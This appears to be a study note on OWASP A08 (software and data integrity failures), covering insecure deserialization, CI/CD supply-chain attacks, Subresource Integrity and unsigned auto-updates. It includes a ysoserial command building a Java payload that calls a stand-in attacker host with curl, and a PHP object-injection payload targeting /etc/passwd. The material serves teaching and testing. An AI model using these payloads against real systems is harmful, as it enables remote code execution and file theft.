# A08 — Software and Data Integrity Failures

← [[OWASP-Overview]]

---

This category covers cases where code or data is used without verifying its integrity — meaning an attacker can substitute malicious code or data and the system accepts it as legitimate.

---

## What Falls Under This Category

- Deserialization of untrusted data without integrity checks
- CI/CD pipelines that pull code or dependencies from untrusted sources
- Auto-update mechanisms that don't verify signatures
- Content delivery from untrusted CDNs without Subresource Integrity (SRI)
- Supply chain attacks (compromising a library used by many applications)

---

## Insecure Deserialization

Serialization converts an object to a format that can be stored or transmitted (JSON, XML, binary). Deserialization reverses it.

**The vulnerability:** If user-controlled data is deserialized without validation, an attacker can craft a malicious serialized object that triggers arbitrary code execution during deserialization.

### Java Deserialization

Java's native serialization (binary format, starts with `AC ED 00 05` or `rO0A` in base64) is notorious for RCE gadget chains.

```bash
# Identify Java serialized data
# Base64 encoded: rO0AB...
# Raw hex: AC ED 00 05...

# ysoserial — Java deserialization exploit generator
java -jar ysoserial.jar CommonsCollections6 "curl https://attacker.com" | base64
```

**Where to find it:** Java web apps accepting cookies, parameters, or body data in binary format. Common in older Java EE apps, Apache Struts, JBoss, WebLogic.

### PHP Object Injection

PHP's `unserialize()` function with user input can be exploited via "magic methods" (`__destruct`, `__wakeup`, `__toString`).

```php
// Vulnerable
$data = unserialize($_COOKIE['user_prefs']);

// Exploit
O:8:"UserPref":1:{s:4:"path";s:11:"/etc/passwd";}
```

**Where to find it:** PHP apps using cookies or parameters that look like `O:...` (PHP serialized format) or base64 that decodes to it.

### Python Pickle

Python's `pickle` module executes arbitrary code during deserialization.

```python
# Vulnerable
import pickle
data = pickle.loads(user_input)

# Exploit: craft a pickle that runs os.system('whoami')
```

**Where to find it:** ML/data science apps, Python services that accept binary data.

---

## CI/CD Pipeline Attacks

Supply chain attacks targeting build pipelines:

- **Dependency confusion** — attacker publishes a malicious package with the same name as an internal package to a public registry; build system pulls the wrong one
- **Compromised build server** — if the build server runs untrusted code from PRs, an attacker PR can exfiltrate secrets
- **Malicious GitHub Actions** — using a third-party Action that has been compromised

**Real example:** In 2021, the `ua-parser-js` npm package was compromised — its published version installed a cryptominer. Apps using this package had it silently executed.

---

## Subresource Integrity (SRI)

When loading scripts or stylesheets from a CDN, if the CDN is compromised the attacker can serve malicious code.

**Without SRI:**
```html
<script src="https://cdn.example.com/jquery-3.6.0.min.js"></script>
```

**With SRI:**
```html
<script 
  src="https://cdn.example.com/jquery-3.6.0.min.js"
  integrity="sha384-vtXRMe3mGCbOeY7l30aIg8H9p3GdeSe4IFlP6G8JMa7o7lXvnz3GFKzPxzJdPfGK"
  crossorigin="anonymous">
</script>
```

If the CDN serves a different file (compromised), the hash won't match and the browser blocks it.

**Testing:** Look at HTML source for third-party scripts. Do they have `integrity` attributes? Missing SRI on CDN-hosted scripts = finding (low severity, but valid).

---

## Auto-Update Mechanisms

Apps that auto-update without verifying the signature of the update can be hijacked:
- MITM the update channel
- Compromise the update server
- Point the update URL somewhere else (via SSRF or DNS hijacking)

---

## Detecting Deserialization Vulnerabilities

```bash
# Look for serialized data markers in requests (Burp Suite)
# Java: rO0A (base64) or AC ED (hex)
# PHP: O: or a: (object/array notation)
# Python: \x80\x02 or \x80\x04 (pickle protocol marker)

# Parameter names that suggest deserialization
viewstate, __VIEWSTATE    ← ASP.NET ViewState (often .NET binary format)
serialized_object
user_data (if base64 encoded)
```

---

*Related: [[A06-Vulnerable-Components]] | [[A05-Security-Misconfiguration]] | [[OWASP-Overview]]*

*Sources: OWASP Top 10 2021, PortSwigger Web Security Academy*
